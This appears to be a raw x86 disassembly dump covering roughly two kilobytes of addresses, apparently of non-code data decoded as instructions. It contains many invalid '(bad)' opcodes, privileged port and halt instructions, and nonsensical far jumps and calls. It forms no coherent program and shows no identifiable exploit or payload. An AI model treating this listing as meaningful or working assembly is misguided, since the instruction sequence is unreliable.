  40c466:	mov    esi,0xc30502da
  40c46b:	std    
  40c46c:	or     ebx,edx
  40c46e:	mov    BYTE PTR ds:0xd8fdecdb,0xc4
  40c475:	bnd call 0xd2ed9a29
  40c47b:	into   
  40c47c:	stc    
  40c47d:	mov    al,0xb2
  40c47f:	lods   eax,DWORD PTR ds:[esi]
  40c480:	mov    al,0xd1
  40c482:	hlt    
  40c483:	fdivp  st(5),st
  40c485:	test   esi,0xd6c502cd
  40c48b:	std    
  40c48c:	inc    DWORD PTR [eax+ebx*8]
  40c48f:	aad    0xc9
  40c491:	fsubrp st(3),st
  40c493:	adc    eax,DWORD PTR [edi]
  40c495:	scas   eax,DWORD PTR es:[edi]
  40c496:	retf   0xe4cf
  40c499:	loope  0x40c452
  40c49b:	in     al,dx
  40c49c:	shl    cl,cl
  40c49e:	fsub   st,st(4)
  40c4a0:	aad    0xc4
  40c4a2:	call   0xe93c9581
  40c4a7:	mov    edi,0x7fcfbfa
  40c4ac:	(bad)  
  40c4ad:	xlat   BYTE PTR ds:[ebx]
  40c4ae:	fnclex 
  40c4b0:	push   es
  40c4b1:	add    ecx,esp
  40c4b3:	clc    
  40c4b4:	loope  0x40c460
  40c4b6:	int3   
  40c4b7:	shl    edi,cl
  40c4b9:	mov    ebp,0xcfa8d1cd
  40c4be:	mov    cl,0xd0
  40c4c0:	mov    al,0xd9
  40c4c2:	imul   al
  40c4c4:	hlt    
  40c4c5:	fld    QWORD PTR [eax]
  40c4c7:	cld    
  40c4c8:	sar    DWORD PTR [ebp-0x270215f5],cl
  40c4ce:	(bad)  
  40c4d0:	push   cs
  40c4d1:	aad    0x13
  40c4d3:	loopne 0x40c4a1
  40c4d5:	lods   eax,DWORD PTR ds:[esi]
  40c4d6:	(bad)  
  40c4d7:	repz int 0xcf
  40c4da:	mul    ah
  40c4dc:	out    0xbb,eax
  40c4de:	shr    dh,cl
  40c4e0:	(bad)  
  40c4e2:	jmp    0xe041addb
  40c4e7:	fcmovu st,st(3)
  40c4e9:	mov    esi,0x5c7e5d6
  40c4ee:	or     ecx,ecx
  40c4f0:	clc    
  40c4f1:	hlt    
  40c4f2:	fyl2xp1 
  40c4f4:	leave  
  40c4f5:	test   eax,0xcef7f6aa
  40c4fa:	sti    
  40c4fb:	mov    bl,0xd1
  40c4fd:	hlt    
  40c4fe:	mov    al,0xcc
  40c500:	(bad)
  40c503:	shl    DWORD PTR [edi+ebp*8-0x3a2a4041],cl
  40c50a:	pop    es
  40c50b:	repz inc edx
  40c50e:	or     ch,al
  40c510:	fld    DWORD PTR [ebx]
  40c512:	iret   
  40c513:	push   es
  40c514:	repnz out 0xe1,eax
  40c517:	lods   al,BYTE PTR ds:[esi]
  40c518:	mov    dl,0xb7
  40c51a:	out    dx,eax
  40c51b:	in     al,0xda
  40c51d:	repz out dx,al
  40c51f:	retf   0xecbf
  40c522:	fcmovnu st,st(3)
  40c524:	call   0xcf3b8e0a
  40c529:	mov    esp,0xf6e0f7eb
  40c52e:	neg    ebp
  40c530:	jmp    0x100ac814
  40c535:	mov    bl,0xbc
  40c537:	jmp    0xd9c9:0xc5b7b7f5
  40c53e:	aam    0xe7
  40c540:	call   0xfa0d9739
  40c545:	(bad)  
  40c546:	out    dx,eax
  40c547:	(bad)  
  40c549:	(bad)
  40c54c:	cmc    
  40c54d:	loop   0x40c538
  40c54f:	retf   0xe8c4
  40c552:	out    dx,eax
  40c553:	add    eax,DWORD PTR [edx]
  40c555:	out    0xe3,al
  40c557:	shr    DWORD PTR [esp+ebp*8-0x4f492c12],0xed
  40c55f:	out    dx,eax
  40c560:	out    dx,eax
  40c561:	inc    esp
  40c563:	fcomip st,st(6)
  40c565:	add    al,bh
  40c567:	ret    0xf8f7
  40c56a:	mov    ebp,0xd5fad0dd
  40c56f:	(bad)  
  40c570:	or     BYTE PTR [ecx],al
  40c572:	leave  
  40c573:	out    0x8,eax
  40c575:	out    0xed,eax
  40c577:	out    0xc9,eax
  40c579:	mov    esp,0xc6d5cbb3
  40c57e:	mov    edx,0xcbb9d0c4
  40c583:	imul   ch
  40c585:	aam    0xe3
  40c587:	icebp  
  40c588:	shl    bh,cl
  40c58a:	lock jecxz 0x40c56b
  40c58d:	call   0xfc298c94
  40c592:	lds    eax,FWORD PTR ds:0xe7bde6ca
  40c598:	ret    
  40c599:	cmc    
  40c59a:	test   ah,0xc6
  40c59d:	int    0xcf
  40c59f:	in     eax,dx
  40c5a0:	enter  0xc8d5,0xc9
  40c5a4:	fcmovnu st,st(3)
  40c5a6:	sti    
  40c5a7:	add    bh,ah
  40c5a9:	inc    dh
  40c5ab:	fcomp  st(1)
  40c5ad:	(bad)
  40c5b0:	retf   0xa0c
  40c5b3:	cld    
  40c5b4:	repz ffree st(0)
  40c5b7:	jecxz  0x40c59a
  40c5b9:	in     al,0xec
  40c5bb:	hlt    
  40c5bc:	(bad)  
  40c5bd:	icebp  
  40c5be:	ror    al,cl
  40c5c0:	hlt    
  40c5c1:	retf   0xdcd6
  40c5c4:	fcmovnb st,st(1)
  40c5c6:	aam    0xf9
  40c5c8:	repnz mov ebx,0xc40bf6d4
  40c5ce:	loop   0x40c5de
  40c5d0:	push   cs
  40c5d1:	or     al,dl
  40c5d3:	enter  0xeaf1,0xea
  40c5d7:	test   al,0xc1
  40c5d9:	icebp  
  40c5da:	out    0xb0,al
  40c5dc:	mov    edx,0xffffb6cf
  40c5e1:	mov    esi,0xfef3d6eb
  40c5e6:	mov    dh,0xf4
  40c5e8:	mov    esp,0xe1d8beff
  40c5ed:	cld    
  40c5ee:	jecxz  0x40c5d9
  40c5f0:	out    0xc4,al
  40c5f2:	out    dx,al
  40c5f3:	jmp    0x40c606
  40c5f5:	mov    esi,0xe1b7f6cf
  40c5fa:	retf   0xbaca
  40c5fd:	in     eax,0xca
  40c5ff:	mov    al,0xb8
  40c601:	in     al,dx
  40c602:	clc    
  40c603:	cld    
  40c604:	mov    al,0xf0
  40c606:	xlat   BYTE PTR ds:[ebx]
  40c607:	add    cl,bh
  40c609:	xlat   BYTE PTR ds:[ebx]
  40c60a:	icebp  
  40c60b:	fdivp  st(6),st
  40c60d:	retf   
  40c60e:	fiadd  DWORD PTR ds:0xf9c5e9d8
  40c614:	stc    
  40c615:	fisubr WORD PTR [edi-0x3c38090f]
  40c61b:	les    esi,FWORD PTR [esi-0x42a4d4f]
  40c621:	mov    edx,0x2dcd3c4
  40c626:	mov    edx,0xe1e3be06
  40c62b:	pop    es
  40c62c:	add    eax,DWORD PTR [ebx]
  40c62e:	in     eax,0xcf
  40c630:	or     ah,ah
  40c632:	out    0x9,eax
  40c634:	in     al,dx
  40c635:	retf   
  40c636:	out    dx,eax
  40c637:	jecxz  0x40c5fb
  40c639:	scas   eax,DWORD PTR es:[edi]
  40c63a:	scas   al,BYTE PTR es:[edi]
  40c63b:	hlt    
  40c63c:	mov    ch,0xd7
  40c63e:	shr    DWORD PTR [ebp-0x1310230e],1
  40c644:	loope  0x40c637
  40c646:	iret   
  40c647:	sar    BYTE PTR [edi-0x2e012e28],cl
  40c64d:	mov    edi,0xded8d4be
  40c652:	or     ecx,edx
  40c654:	or     esp,DWORD PTR [edi-0x43131e4e]
  40c65a:	loop   0x40c64c
  40c65c:	loopne 0x40c619
  40c65e:	in     al,0xc5
  40c660:	iret   
  40c661:	out    dx,al
  40c662:	in     al,0xe8
  40c664:	cli    
  40c665:	ror    edi,cl
  40c667:	push   es
  40c668:	aam    0xbf
  40c66a:	in     eax,0xcb
  40c66c:	retf   0xfbf5
  40c66f:	clc    
  40c670:	leave  
  40c671:	fcmovb st,st(6)
  40c673:	fucom  st(2)
  40c675:	in     eax,0xac
  40c677:	(bad)  
  40c679:	(bad)  
  40c67a:	stos   BYTE PTR es:[edi],al
  40c67b:	cmc    
  40c67c:	in     eax,0xce
  40c67e:	rcr    dh,0xee
  40c681:	mov    ebp,0xf6fad0db
  40c686:	fnstsw WORD PTR [ecx-0x3e0e0123]
  40c68c:	fmul   st,st(1)
  40c68e:	or     bh,al
  40c690:	or     BYTE PTR [esi],cl
  40c692:	leave  
  40c693:	or     ebp,edx
  40c695:	out    0xd1,eax
  40c697:	(bad)  
  40c698:	mov    ebp,0xc2adb6b7
  40c69d:	out    dx,eax
  40c69e:	fcmovb st,st(5)
  40c6a0:	(bad)  
  40c6a1:	jmp    0xd522b271
  40c6a6:	clc    
  40c6a7:	loope  0x40c682
  40c6a9:	loop   0x40c671
  40c6ab:	mov    ecx,0x9dcca06
  40c6b0:	loop   0x40c6aa
  40c6b2:	add    ecx,edx
  40c6b4:	repz shl edi,cl
  40c6b7:	fucomip st,st(6)
  40c6b9:	loope  0x40c68e
  40c6bb:	loop   0x40c696
  40c6bd:	cli    
  40c6be:	mov    ebx,0xc8e4b7b7
  40c6c3:	jmp    0xbfd2:0xf6c8dbd7
  40c6ca:	out    0xe2,eax
  40c6cc:	test   BYTE PTR [esi],0xdd
  40c6cf:	add    DWORD PTR [esp+esi*8],eax
  40c6d2:	fcmovnu st,st(0)
  40c6d4:	or     eax,edx
  40c6d6:	mov    cl,0xad
  40c6d8:	mov    cl,0xe1
  40c6da:	shr    ah,1
  40c6dc:	shr    edi,0xb2
  40c6df:	jmp    0xf7fd:0xf5ebc4bb
  40c6e6:	fdiv   st,st(1)
  40c6e8:	fst    st(7)
  40c6ea:	ret    
  40c6eb:	ret    
  40c6ec:	fucom  st(4)
  40c6ee:	imul   dh
  40c6f0:	fsubrp st(2),st
  40c6f2:	or     cl,bh
  40c6f4:	out    0xb2,eax
  40c6f6:	in     al,dx
  40c6f7:	in     eax,0xd0
  40c6f9:	scas   eax,DWORD PTR es:[edi]
  40c6fa:	loope  0x40c6e9
  40c6fc:	in     eax,0xf3
  40c6fe:	div    bl
  40c700:	stc    
  40c701:	mov    bh,0xcf
  40c703:	mov    edi,0xf5fbd9fa
  40c708:	stc    
  40c709:	repnz fldl2e 
  40c70c:	pop    es
  40c70d:	shr    bl,1
  40c70f:	ror    BYTE PTR [eax],0xce
  40c712:	push   cs
  40c713:	or     ebx,esp
  40c715:	shr    ah,cl
  40c717:	vcmpps xmm2,xmm1,xmm1,0xac
  40c71c:	fxch   st(6)
  40c71e:	ror    dl,cl
  40c720:	repnz jmp 0xf3cd:0xbf02f5dc
  40c728:	mov    eax,0xe1ddf9f9
  40c72d:	loope  0x40c736
  40c72f:	retf   
  40c730:	or     esp,ebp
  40c732:	fsin   
  40c734:	jmp    0xdd2d8019
  40c739:	(bad)  
  40c73a:	shl    bh,1
  40c73c:	(bad)
  40c73f:	shr    ah,1
  40c741:	idiv   DWORD PTR [ecx-0x2e26fe03]
  40c747:	mov    eax,0xd7f3c5d9
  40c74c:	retf   
  40c74d:	hlt    
  40c74e:	ret    0xd8ef
  40c751:	fucomip st,st(2)
  40c753:	enter  0xd312,0xac
  40c757:	fucom  st(3)
  40c759:	stos   DWORD PTR es:[edi],eax
  40c75a:	in     eax,0xcf
  40c75c:	sti    
  40c75d:	clc    
  40c75e:	mov    ecx,0xebc4d1b8
  40c763:	cld    
  40c764:	mov    ecx,0xedbcf001
  40c769:	xlat   BYTE PTR ds:[ebx]
  40c76a:	lock jecxz 0x40c74b
  40c76d:	(bad)  
  40c76e:	cmc    
  40c76f:	(bad)  
  40c771:	or     ecx,edx
  40c773:	wbinvd 
  40c775:	iret   
  40c776:	shl    cl,0xb3
  40c779:	call   0xed27ad45
  40c77e:	int    0xfe
  40c780:	rcl    bl,cl
  40c782:	shl    esi,cl
  40c784:	hlt    
  40c785:	mov    edi,0xf6bde7c3
  40c78a:	rcl    cl,0xf9
  40c78d:	cld    
  40c78e:	add    edi,eax
  40c790:	jmp    0x40c76d
  40c792:	iret   
  40c793:	add    ah,cl
  40c795:	mov    esi,0xe9e0cdc1
  40c79a:	mov    esp,0xede1eccb
  40c79f:	fstp   TBYTE PTR [eax-0x4241615]
  40c7a5:	mov    ebp,0xfbfa00f6
  40c7aa:	(bad)  
  40c7ac:	(bad)  
  40c7ad:	cld    
  40c7ae:	jecxz  0x40c796
  40c7b0:	cld    
  40c7b1:	fmul   DWORD PTR [edi]
  40c7b3:	rol    DWORD PTR [edx],cl
  40c7b5:	scas   eax,DWORD PTR es:[edi]
  40c7b6:	fsub   st,st(4)
  40c7b8:	rcl    ch,0xc1
  40c7bb:	enter  0xc5f6,0xe8
  40c7bf:	stc    
  40c7c0:	mov    dh,0xbf
  40c7c2:	out    dx,eax
  40c7c3:	jecxz  0x40c7a0
  40c7c5:	jmp    0xc21e87c9
  40c7ca:	hlt    
  40c7cb:	loop   0x40c78e
  40c7cd:	loope  0x40c7d1
  40c7cf:	in     al,0xfe
  40c7d1:	pop    es
  40c7d2:	in     eax,0xe7
  40c7d4:	fnstsw WORD PTR [edi-0xb2c113f]
  40c7da:	retf   0xd7c2
  40c7dd:	(bad)  
  40c7df:	fucomi st,st(1)
  40c7e1:	(bad)  
  40c7e3:	sti    
  40c7e4:	fdivr  st(7),st
  40c7e6:	jecxz  0x40c7e5
  40c7e8:	int3   
  40c7e9:	cli    
  40c7ea:	repnz add al,0xf6
  40c7ed:	in     eax,0xe7
  40c7ef:	loopne 0x40c7cb
  40c7f1:	(bad)  
  40c7f3:	fimul  DWORD PTR ds:0xddafbeae
  40c7f9:	hlt    
  40c7fa:	xlat   BYTE PTR ds:[ebx]
  40c7fb:	retf   
  40c7fc:	stc    
  40c7fd:	fdivr  DWORD PTR [ecx-0x2247282d]
  40c803:	jmp    0xfc11a9d2
  40c808:	fistp  QWORD PTR [ebx-0x1ff91f01]
  40c80e:	(bad)  
  40c80f:	std    
  40c810:	fucomp st(6)
  40c812:	fucomi st,st(0)
  40c814:	enter  0xdde0,0xb1
  40c818:	rcl    ebx,0xb4
  40c81b:	shl    BYTE PTR [esi-0xe4b1f36],0xbf
  40c822:	cld    
  40c823:	retf   0xc3f8
  40c826:	clc    
  40c827:	mov    ecx,0xfcc0f5f6
  40c82c:	hlt    
  40c82d:	fcmovb st,st(0)
  40c82f:	(bad)  [ecx]
  40c831:	add    bl,cl
  40c833:	add    BYTE PTR [ecx],dl
  40c835:	rol    bl,1
  40c837:	in     al,dx
  40c838:	int    0xd2
  40c83a:	mov    dl,0xc9
  40c83c:	test   al,0xb1
  40c83e:	jmp    0xc8fd:0xd3f7cde7
  40c845:	mov    bh,0xc3
  40c847:	mov    eax,0xb9e7e4e1
  40c84c:	fsub   st(3),st
  40c84e:	fcmovnb st,st(0)
  40c850:	retf   0xeea
  40c853:	add    eax,0xcce1e9cb
  40c858:	bnd ret 
  40c85a:	xlat   BYTE PTR ds:[ebx]
  40c85b:	sti    
  40c85c:	icebp  
  40c85d:	mov    edx,0xe5bed7d4
  40c862:	lock rol bl,1
  40c865:	(bad)  
  40c866:	add    bh,BYTE PTR [ecx-0x3ff0b12]
  40c86c:	add    eax,DWORD PTR [edx]
  40c86e:	ret    0xda06
  40c871:	loop   0x40c879
  40c873:	or     esp,eax
  40c875:	mov    cl,0xdc
  40c877:	leave  
  40c878:	rol    esp,0xdb
  40c87b:	loope  0x40c86f
  40c87d:	loope  0x40c868
  40c87f:	mov    ecx,0xd9e3dad3
  40c884:	shl    bl,1
  40c886:	cmc    
  40c887:	add    DWORD PTR [edi-0x213b42fa],edi
  40c88d:	rol    DWORD PTR [esi],1
  40c88f:	cld    
  40c890:	(bad)  
  40c891:	jecxz  0x40c85b
  40c893:	or     eax,0xcacfec0b
  40c898:	test   al,0xb0
  40c89a:	mov    esp,0xd7c9daf5
  40c89f:	(bad)  
  40c8a0:	lock icebp 
  40c8a2:	(bad)  
  40c8a4:	add    dl,ah
  40c8a6:	loopne 0x40c864
  40c8a8:	add    ah,bh
  40c8aa:	or     edx,esi
  40c8ac:	cli    
  40c8ad:	cld    
  40c8ae:	test   edx,0xdecfe7bc
  40c8b4:	adc    edx,ecx
  40c8b6:	mov    dl,0xb7
  40c8b8:	div    dl
  40c8ba:	(bad)
  40c8bd:	iret   
  40c8be:	in     eax,dx
  40c8bf:	aam    0xdb
  40c8c1:	(bad)  
  40c8c3:	dec    esp
  40c8c5:	mov    edx,0xd6e2dafb
  40c8ca:	add    al,bl
  40c8cc:	pop    es
  40c8cd:	(bad)  
  40c8cf:	stc    
  40c8d0:	fucomip st,st(4)
  40c8d2:	fdivr  st,st(5)
  40c8d4:	iret   
  40c8d5:	mov    bl,0xc7
  40c8d7:	out    0xea,al
  40c8d9:	mov    ch,0xf6
  40c8db:	cli    
  40c8dc:	jmp    0xfbbf:0xead3c5b0
  40c8e3:	(bad)  
  40c8e4:	out    dx,eax
  40c8e5:	mov    bh,0xe1
  40c8e7:	shl    cl,cl
  40c8e9:	in     al,0xfe
  40c8eb:	test   cl,0xd7
  40c8ee:	retf   0xe10e
  40c8f1:	(bad)  
  40c8f2:	or     eax,0xf2c2cade
  40c8f7:	icebp  
  40c8f8:	(bad)
  40c8fb:	jmp    0x40c8ea
  40c8fd:	cmc    
  40c8fe:	rcl    dh,0xee
  40c901:	jmp    0xd0c1:0x1cff9ef
  40c908:	aad    0xfa
  40c90a:	clc    
  40c90b:	add    BYTE PTR [edx+ebx*8+0x7dac9d0],bh
  40c912:	retf   
  40c913:	in     eax,0xef
  40c915:	repz loop 0x40c8fa
  40c918:	mov    esp,0xe4e3d7b0
  40c91d:	int    0xe7
  40c91f:	fldl2t 
  40c921:	mov    bl,0xf5
  40c923:	in     al,dx
  40c924:	iret   
  40c925:	mov    eax,0xdbfcbde1
  40c92a:	stc    
  40c92b:	or     dh,al
  40c92d:	sar    bl,1
  40c92f:	out    dx,eax
  40c930:	add    dl,ah
  40c932:	add    dl,dh
  40c934:	adc    eax,edi
  40c936:	call   0xc811790b
  40c93b:	mov    cl,0xd9
  40c93d:	cli    
  40c93e:	in     eax,0xdb
  40c940:	mov    ecx,0xbacadbb6
  40c945:	loopne 0x40c946
  40c947:	hlt    
  40c948:	sar    DWORD PTR [edi-0x93f2d34],0xdf
  40c94f:	retf   0xfde4
  40c952:	repz jmp eax
  40c955:	shr    BYTE PTR [eax-0x1c4c0941],cl
  40c95b:	mov    al,0xe5
  40c95d:	mov    ch,0xcb
  40c95f:	fdiv   st,st(1)
  40c961:	(bad)
  40c964:	aam    0xf6
  40c966:	mov    eax,0xba05f403
  40c96b:	cld    
  40c96c:	pop    es
  40c96d:	clc    
  40c96e:	stc    
  40c96f:	jmp    0xbee1:0xeae409c0
  40c976:	retf   0xe3c1
  40c979:	cmc    
  40c97a:	retf   
  40c97b:	lods   al,BYTE PTR ds:[esi]
  40c97c:	in     al,dx
  40c97d:	rcr    ecx,0xff
  40c980:	(bad)  
  40c982:	fdiv   st,st(2)
  40c984:	(bad)  
  40c986:	ror    ch,cl
  40c988:	aad    0xe4
  40c98a:	sti    
  40c98b:	ror    ebx,0xc1
  40c98e:	aam    0xfe
  40c990:	or     dh,ch
  40c992:	out    dx,eax
  40c993:	fsub   st,st(3)
  40c995:	fsubr  st,st(1)
  40c997:	jecxz  0x40c980
  40c999:	repnz retf 
  40c99b:	retf   
  40c99c:	retf   0xb7f8
  40c99f:	retf   
  40c9a0:	into   
  40c9a1:	mov    eax,0xcdc2d8f7
  40c9a6:	mov    eax,0xe4e703ce
  40c9ab:	or     esp,ecx
  40c9ad:	jmp    0xe8fd:0xfc80bf0
  40c9b4:	into   
  40c9b5:	call   0xecff7298
  40c9ba:	in     eax,0xc9
  40c9bc:	fyl2x  
  40c9be:	loopne 0x40c986
  40c9c0:	mov    ebx,0x1bcd6b8
  40c9c5:	fucomp st(7)
  40c9c7:	sar    BYTE PTR [edi-0x292e1e42],cl
  40c9cd:	cld    
  40c9ce:	(bad)  
  40c9cf:	fisttp WORD PTR [edx]
  40c9d1:	fcmovnu st,st(1)
  40c9d3:	push   es
  40c9d4:	in     eax,dx
  40c9d5:	(bad)  
  40c9d6:	test   al,0xf0
  40c9d8:	fidiv  WORD PTR [ebp-0x4e2f134c]
  40c9de:	retf   
  40c9df:	mov    cl,0xf7
  40c9e1:	mov    bh,0xd6
  40c9e3:	mov    ah,0xdd
  40c9e5:	int    0xe7
  40c9e7:	imul   dh
  40c9e9:	xlat   BYTE PTR ds:[ebx]
  40c9ea:	(bad)  
  40c9eb:	dec    ebx
  40c9ed:	jecxz  0x40c9c3
  40c9ef:	psubsw mm0,QWORD PTR [edi]
  40c9f2:	cli    
  40c9f3:	cli    
  40c9f4:	push   cs
  40c9f5:	out    0xb0,eax
  40c9f7:	jmp    0x40c9eb
  40c9f9:	(bad)
  40c9fc:	hlt    
  40c9fd:	rol    dh,0xe6
  40ca00:	repnz fucomi st,st(7)
  40ca03:	mov    esi,0xd4f7f0d9
  40ca08:	add    al,bh
  40ca0a:	(bad)  
  40ca0b:	(bad)  
  40ca0d:	cld    
  40ca0e:	imul   esi
  40ca10:	fucomi st,st(3)
  40ca12:	int3   
  40ca13:	fiadd  DWORD PTR [ecx]
  40ca15:	lods   eax,DWORD PTR ds:[esi]
  40ca16:	scas   eax,DWORD PTR es:[edi]
  40ca17:	jmp    0x40c9c5
  40ca19:	retf   
  40ca1a:	jecxz  0x40ca06
  40ca1c:	mov    cl,0xce
  40ca1e:	xlat   BYTE PTR ds:[ebx]
  40ca1f:	mov    ah,0xf9
  40ca21:	out    dx,al
  40ca22:	jmp    0x6d5:0xfbf0caeb
  40ca29:	idiv   dh
  40ca2b:	out    0xf5,eax
  40ca2d:	div    esi
  40ca2f:	aad    0xe5
  40ca31:	pop    es
  40ca32:	add    eax,0xe8e509ff
  40ca37:	in     eax,0xe1
  40ca39:	(bad)  
  40ca3a:	in     al,0xb5
  40ca3c:	(bad)  
  40ca3d:	div    DWORD PTR [esi-0x1b125331]
  40ca43:	(bad)  
  40ca45:	ret    0xd9da
  40ca48:	mov    ebp,0x6c6f5f0
  40ca4d:	pop    es
  40ca4e:	cmc    
  40ca4f:	out    0xe5,al
  40ca51:	in     al,dx
  40ca52:	cli    
  40ca53:	call   0xb3ee994a
  40ca58:	repz call 0xce16ba49
  40ca5e:	retf   0xffd3
  40ca61:	fbstp  TBYTE PTR [edx-0x2f432e2a]
  40ca67:	cmc    
  40ca68:	fistp  QWORD PTR [edi-0x2bf81a3b]
  40ca6e:	(bad)
  40ca71:	or     ebx,eax
  40ca73:	or     ah,ah
  40ca75:	loope  0x40ca56
  40ca77:	shl    bh,1
  40ca79:	leave  
  40ca7a:	retf   0xd9c3
  40ca7d:	aad    0xdf
  40ca7f:	in     al,dx
  40ca80:	retf   0xded0
  40ca83:	mov    eax,0xeec1c3f6
  40ca88:	into   
  40ca89:	add    al,0xeb
  40ca8b:	add    ah,al
  40ca8d:	hlt    
  40ca8e:	aad    0xd7
  40ca90:	jecxz  0x40ca7b
  40ca92:	loop   0x40caa1
  40ca94:	loope  0x40ca42
  40ca96:	(bad)  
  40ca97:	out    0xf3,al
  40ca99:	shl    bl,cl
  40ca9b:	out    0xe6,eax
  40ca9d:	mul    al
  40ca9f:	repnz cli 
  40caa1:	fcmove st,st(7)
  40caa3:	lock repnz repz sti 
  40caa7:	mov    eax,0x6c2dbe5
  40caac:	add    ecx,DWORD PTR [ebx]
  40caae:	test   BYTE PTR ds:0xffcee4c0,0xcb
  40cab5:	rcl    edx,0xbc
  40cab8:	test   al,0xcf
  40caba:	(bad)  
  40cabb:	loope  0x40ca84
  40cabd:	mov    edx,0xdfc8fee5
  40cac2:	in     al,0xfa
  40cac4:	in     al,dx
  40cac5:	(bad)  
  40cac6:	mov    edx,0xfadbf9
  40cacb:	ret    0xe1ea
  40cace:	or     bl,cl
  40cad0:	jmp    0xb28a6d7
  40cad5:	retf   
  40cad6:	ror    eax,0xca
  40cad9:	jmp    0x40caa1
  40cadb:	retf   0xe6f4
  40cade:	aad    0xcc
  40cae0:	int    0xdc
  40cae2:	in     eax,dx
  40cae3:	rcl    dh,1
  40cae5:	clc    
  40cae6:	rcr    ah,cl
  40cae8:	mov    eax,0xf7e5c4f2
  40caed:	cld    
  40caee:	clc    
  40caef:	stc    
  40caf0:	out    dx,al
  40caf1:	in     al,0x1
  40caf3:	add    eax,0xe4d0c80a
  40caf8:	ret    0xcfc7
  40cafb:	mov    cl,0xe6
  40cafd:	stc    
  40cafe:	(bad)  
  40cb00:	retf   0xcaba
  40cb03:	retf   
  40cb04:	mov    esp,0xbccdd0e1
  40cb09:	(bad)  
  40cb0b:	jecxz  0x40cae8
  40cb0d:	ffreep st(6)
  40cb0f:	idiv   ch
  40cb11:	or     edi,esp
  40cb13:	jmp    0xbe19b425
  40cb18:	lods   al,BYTE PTR ds:[esi]
  40cb19:	mov    cl,0xcf
  40cb1b:	jmp    0xccd8:0xd8f1d9cf
  40cb22:	fadd   st,st(3)
  40cb24:	stc    
  40cb25:	fnstsw WORD PTR [edx-0xafbff23]
  40cb2b:	(bad)  
  40cb2c:	neg    bl
  40cb2e:	fxch   st(2)
  40cb30:	(bad)  
  40cb31:	int    0xb
  40cb33:	jecxz  0x40cb21
  40cb35:	call   0xd3148e11
  40cb3a:	retf   
  40cb3b:	loopne 0x40cb09
  40cb3d:	in     al,dx
  40cb3e:	(bad)  
  40cb3f:	into   
  40cb40:	shl    ebp,cl
  40cb42:	sar    DWORD PTR [ecx-0x12403327],1
  40cb48:	std    
  40cb49:	fdivp  st(4),st
  40cb4b:	jmp    0x40cb2a
  40cb4d:	add    ecx,eax
  40cb4f:	dec    BYTE PTR [edi]
  40cb51:	ret    
  40cb52:	std    
  40cb53:	in     eax,0x4
  40cb55:	in     eax,0xb2
  40cb57:	fcomip st,st(0)
  40cb59:	mov    bl,0xe8
  40cb5b:	lods   eax,DWORD PTR ds:[esi]
  40cb5c:	mov    cl,0xaf
  40cb5e:	(bad)  
  40cb5f:	out    0xc9,eax
  40cb61:	mov    esi,0xc1d1fed7
  40cb66:	cli    
  40cb67:	fdivrp st(3),st
  40cb69:	repnz fdivp st(5),st
  40cb6c:	jecxz  0x40cb2f
  40cb6e:	out    0xef,al
  40cb70:	out    0x3,al
  40cb72:	fimul  DWORD PTR ds:0xe3ececde
  40cb78:	in     eax,dx
  40cb79:	lods   al,BYTE PTR ds:[esi]
  40cb7a:	mov    ch,0xcf
  40cb7c:	repnz mov ch,0xe0
  40cb7f:	jmp    0xbafcb87c
  40cb84:	loope  0x40cb67
  40cb86:	hlt    
  40cb87:	mov    ecx,0x1f6e1bc
  40cb8c:	loop   0x40cb92
  40cb8e:	loope  0x40cb55
  40cb90:	add    esi,ebp
  40cb92:	in     al,dx
  40cb93:	in     eax,dx
  40cb94:	loope  0x40cb59
  40cb96:	mov    esp,0xc0b3cec0
  40cb9b:	out    0xb1,eax
  40cb9d:	iret   
  40cb9e:	(bad)  
  40cb9f:	out    dx,al
  40cba0:	std    
  40cba1:	mov    esi,0xf6e2eecc
  40cba6:	in     al,dx
  40cba7:	add    ebp,ebp
  40cba9:	jecxz  0x40cb92
  40cbab:	out    0x9,eax
  40cbad:	fsubp  st(3),st
  40cbaf:	fsubr  st(3),st
  40cbb1:	(bad)  
  40cbb2:	std    
  40cbb3:	int    0x8
  40cbb5:	repz fisubr WORD PTR [ebp-0x3f232f52]
  40cbbc:	shl    ch,1
  40cbbe:	ror    esp,cl
  40cbc0:	jmp    0xdc2da3bb
  40cbc5:	sar    ecx,cl
  40cbc7:	add    esi,ebp
  40cbc9:	repnz push es
  40cbcb:	lock shr eax,1
  40cbce:	(bad)  
  40cbd0:	idiv   ch
  40cbd2:	add    al,0xe
  40cbd4:	int3   
  40cbd5:	enter  0xe0ad,0xe8
  40cbd9:	loopne 0x40cbca
  40cbdb:	(bad)  
  40cbdc:	mov    cl,0xf7
  40cbde:	mov    dh,0xb9
  40cbe0:	xabort 0xbf
  40cbe3:	aad    0xd9
  40cbe5:	into   
  40cbe6:	add    esi,esp
  40cbe8:	aam    0x0
  40cbea:	loope  0x40cbbe
  40cbec:	icebp  
  40cbed:	std    
  40cbee:	enter  0xf5e4,0xca
  40cbf2:	retf   
  40cbf3:	cli    
  40cbf4:	jmp    0xd5ea:0xeccae0e5
  40cbfb:	sar    bl,cl
  40cbfd:	stc    
  40cbfe:	retf   
  40cbff:	test   esp,0xbaeddeef
  40cc05:	stc    
  40cc06:	cld    
  40cc07:	(bad)  
  40cc08:	(bad)  
  40cc0a:	rol    ebx,0xd7
  40cc0d:	leave  
  40cc0e:	inc    BYTE PTR [ebx]
  40cc10:	iret   
  40cc11:	(bad)  
  40cc12:	in     al,dx
  40cc13:	retf   0xe402
  40cc16:	out    0xd6,eax
  40cc18:	(bad)  
  40cc19:	icebp  
  40cc1a:	loop   0x40cbe3
  40cc1c:	(bad)
  40cc1f:	in     eax,0xf0
  40cc21:	cli    
  40cc22:	clc    
  40cc23:	enter  0xe0f2,0xec
  40cc27:	neg    bl
  40cc29:	loope  0x40cc1c
  40cc2b:	fadd   QWORD PTR [edx]
  40cc2d:	loop   0x40cc15
  40cc2f:	(bad)  
  40cc30:	aam    0xd
  40cc32:	faddp  st(5),st
  40cc34:	add    ebx,ebp
  40cc36:	(bad)  
  40cc37:	mov    edi,0xc7d4ede7
  40cc3c:	int    0xb3
  40cc3e:	fcmovnb st,st(4)
  40cc40:	mov    eax,0xdaeafbde
  40cc45:	std    
  40cc46:	out    0xcd,eax
  40cc48:	out    dx,al
  40cc49:	add    cl,dl
  40cc4b:	mul    bh
  40cc4d:	rol    DWORD PTR [ebx],0x7
  40cc50:	add    ecx,edi
  40cc52:	push   cs
  40cc53:	jmp    0xe5ee:0xbfcfef00
  40cc5a:	in     eax,dx
  40cc5b:	cli    
  40cc5c:	ror    dh,cl
  40cc5e:	(bad)  
  40cc60:	iret   
  40cc61:	repz mov ecx,0xd2bccab1
  40cc67:	fdiv   st,st(4)
  40cc69:	faddp  st(2),st
